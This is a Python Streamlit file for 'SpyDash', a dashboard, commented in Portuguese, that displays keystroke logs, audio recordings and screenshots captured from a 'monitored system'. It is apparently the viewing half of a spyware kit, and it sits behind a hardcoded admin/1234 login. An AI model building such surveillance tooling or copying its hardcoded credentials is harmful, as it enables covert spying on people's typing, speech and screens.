import streamlit as st
import os

# Página com login
def login():
    st.title("🔐 SpyDash - Login")
    usuario = st.text_input("Usuário")
    senha = st.text_input("Senha", type="password")
    if st.button("Entrar"):
        if usuario == "admin" and senha == "1234":
            st.session_state.logado = True
        else:
            st.error("Credenciais inválidas!")

# Página principal do painel
def painel():
    st.set_page_config(page_title="SpyDash", layout="wide")
    st.title("🕵️ SpyDash - Painel de Monitoramento")
    st.markdown("### Capturas em tempo real")
    st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")

    pasta = "provas"
    if not os.path.exists(pasta):
        st.info("Nenhuma captura foi registrada ainda.")
        return

    arquivos = sorted(os.listdir(pasta), reverse=True)
    for arq in arquivos:
        caminho = os.path.join(pasta, arq)
        st.markdown(f"#### 📁 {arq}")
        if arq.endswith(".txt"):
            with open(caminho, "r", encoding="utf-8") as f:
                st.code(f.read(), language="text")
        elif arq.endswith(".wav"):
            st.audio(caminho)
        elif arq.endswith((".png", ".jpg", ".jpeg")):
            st.image(caminho)
        st.markdown("---")

# Controle de sessão
if "logado" not in st.session_state:
    st.session_state.logado = False

if st.session_state.logado:
    painel()
else:
    login()
